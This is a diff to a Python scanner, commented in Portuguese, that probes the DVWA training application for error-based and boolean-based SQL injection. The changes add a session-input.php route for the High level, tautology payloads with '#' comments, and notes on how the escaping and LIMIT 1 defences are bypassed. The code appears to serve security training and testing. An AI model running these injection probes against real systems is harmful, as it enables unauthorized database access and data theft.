@@ -28,25 +28,48 @@ SQL_ERROR_SIGNATURES = [
 
 def _send_sqli_probe(session: requests.Session, sqli_url: str, payload: str) -> requests.Response:
     """
-    Envia o payload de teste testando tanto requisições GET quanto POST
-    para suportar diferentes níveis de segurança do DVWA (Low e Medium).
+    Envia o payload de teste testando requisições GET, POST e via session-input.php
+    para suportar todos os níveis de segurança do DVWA (Low, Medium e High).
     """
     params = {"id": payload, "Submit": "Submit"}
+    resp_post = None
     
     # 1. Tenta via GET (padrão Low)
     try:
         resp_get = session.get(sqli_url, params=params, timeout=10)
-        # Se encontrou erro SQL ou múltiplos registros via GET, retorna
         for sig in SQL_ERROR_SIGNATURES:
             if sig.search(resp_get.text):
                 return resp_get
-        if "First name:" in resp_get.text or "<pre>" in resp_get.text:
+        if len(BeautifulSoup(resp_get.text, "html.parser").find_all("pre")) > 1:
             return resp_get
     except requests.RequestException:
         pass
 
     # 2. Tenta via POST (padrão Medium)
-    return session.post(sqli_url, data=params, timeout=10)
+    try:
+        resp_post = session.post(sqli_url, data=params, timeout=10)
+        for sig in SQL_ERROR_SIGNATURES:
+            if sig.search(resp_post.text):
+                return resp_post
+        if len(BeautifulSoup(resp_post.text, "html.parser").find_all("pre")) > 1:
+            return resp_post
+    except requests.RequestException:
+        pass
+
+    # 3. Tenta via session-input.php (padrão High - entrada armazenada na sessão/popup)
+    try:
+        session_input_url = sqli_url.rstrip("/") + "/session-input.php"
+        session.post(session_input_url, data=params, timeout=10)
+        resp_high = session.get(sqli_url, timeout=10)
+        for sig in SQL_ERROR_SIGNATURES:
+            if sig.search(resp_high.text):
+                return resp_high
+        if len(BeautifulSoup(resp_high.text, "html.parser").find_all("pre")) > 1:
+            return resp_high
+    except requests.RequestException:
+        pass
+
+    return resp_post or resp_get
 
 
 def test_error_based_sqli(
@@ -57,7 +80,7 @@ def test_error_based_sqli(
     Testa se a aplicação é vulnerável a SQL Injection baseado em erros (Error-based).
     Injeta caracteres de escape sintático e analisa se mensagens de erro do SGBD vazam na resposta.
     """
-    payloads = ["'", "1'", "1' OR '1'='1", "1 OR 1=1", "admin'--"]
+    payloads = ["'", "1'", "1' OR '1'='1", "1 OR 1=1", "1' OR '1'='1' #", "admin'--", "admin' #"]
 
     for payload in payloads:
         try:
@@ -131,10 +154,12 @@ def test_boolean_based_sqli(
         baseline_results = len(soup_base.find_all("pre"))
 
         # Pares de teste (Tautologia Verdadeira vs Contradição Falsa)
-        # 1' OR '1'='1 (para campos entre aspas - Low) e 1 OR 1=1 (para campos numéricos sem aspas - Medium)
+        # 1' OR '1'='1 (campos entre aspas - Low), 1 OR 1=1 (campos numéricos sem aspas - Medium)
+        # e 1' OR '1'='1' # (comentário para anular LIMIT 1 e entrada via sessão - High)
         test_pairs = [
             ("1' OR '1'='1", "1' AND '1'='2"),
-            ("1 OR 1=1", "1 AND 1=2")
+            ("1 OR 1=1", "1 AND 1=2"),
+            ("1' OR '1'='1' #", "1' AND '1'='2' #")
         ]
 
         for tautology_payload, false_payload in test_pairs:
@@ -152,7 +177,9 @@ def test_boolean_based_sqli(
 
             if tautology_results > baseline_results:
                 if tautology_payload == "1 OR 1=1":
-                    bypass_info = "A injeção explorou a ausência de aspas em campo numérico (ex: WHERE user_id = $id), contornando com sucesso a função mysqli_real_escape_string(). "
+                    bypass_info = "A injeção explorou a ausência de aspas em campo numérico (ex: WHERE user_id = $id), contornando com sucesso a função mysqli_real_escape_string() do nível Medium. "
+                elif "#" in tautology_payload:
+                    bypass_info = "A injeção enviada via canal de sessão (session-input.php) utilizou caracteres de comentário SQL ('#') para anular a cláusula restritiva 'LIMIT 1', contornando as defesas do nível High. "
                 else:
                     bypass_info = "A injeção explorou a concatenação direta de dados na consulta SQL. "
 
